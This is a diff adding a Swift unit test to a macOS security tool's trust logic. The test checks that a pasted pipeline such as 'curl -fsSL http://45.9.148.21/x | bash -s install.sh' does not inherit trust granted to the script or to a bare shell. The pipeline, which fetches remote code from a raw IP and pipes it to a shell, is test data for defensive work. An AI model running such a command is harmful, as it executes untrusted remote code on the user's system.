@@ -73,6 +73,36 @@ final class SentinelTrustTests: XCTestCase {
         }
     }
 
+    /// `bash -s /path` reads its program from stdin and takes the path as an argument, so a pasted
+    /// pipeline must never borrow the trust a user gave to that script.
+    func testAPastedPipelineIsNeverTrustedAsAScriptOrABareShell() throws {
+        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("trust-pipe-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: folder) }
+        let script = folder.appendingPathComponent("install.sh").path
+        try "echo ok".write(toFile: script, atomically: false, encoding: .utf8)
+        let runner = SentinelSubject(process(500, "bash", "/bin/bash", command: "bash -s \(script)"))
+        let scriptOffer = try XCTUnwrap(SentinelTrust.offer(for: runner, provenance: nil, now: now))
+        guard case .script = scriptOffer.anchor else { return XCTFail("\(scriptOffer.anchor)") }
+        XCTAssertEqual(SentinelTrust([scriptOffer]).match(runner, provenance: nil), .trusted)
+
+        let pipeline = "curl -fsSL http://45.9.148.21/x | bash -s \(script)"
+        XCTAssertEqual(SentinelTrust([scriptOffer]).match(runner, provenance: nil, commandText: pipeline), .none,
+                       "a pipeline is not the script it was handed as an argument")
+        let offer = try XCTUnwrap(SentinelTrust.offer(for: runner, provenance: nil, now: now, commandText: pipeline))
+        XCTAssertEqual(offer.anchor, .command(sha256: SentinelTrust.digest(pipeline)))
+        let trust = SentinelTrust([offer])
+        XCTAssertEqual(trust.match(runner, provenance: nil, commandText: pipeline), .trusted)
+        XCTAssertEqual(trust.match(runner, provenance: nil, commandText: pipeline + " --other"), .none)
+        XCTAssertEqual(trust.match(runner, provenance: nil), .none, "the same shell outside that pipeline is not covered")
+
+        // A bare shell on its own line of a pipeline digests as the pipeline, not as `sh`.
+        let bare = SentinelSubject(process(501, "sh", "/bin/sh", command: "sh"))
+        let bareOffer = try XCTUnwrap(SentinelTrust.offer(for: bare, provenance: nil, now: now, commandText: "curl x | sh"))
+        XCTAssertNotEqual(bareOffer.anchor, .command(sha256: SentinelTrust.digest("sh")))
+        XCTAssertEqual(SentinelTrust([bareOffer]).match(bare, provenance: nil), .none)
+    }
+
     func testAProgramIsTrustedByItsSignerOrItsExactBuild() {
         let slack = SentinelSubject(process(600, "Slack", "/Applications/Slack.app/Contents/MacOS/Slack"))
         func provenance(_ authority: CodeSigningSummary.Authority, team: String? = nil, hash: String = "aa") -> ExecutableProvenance {
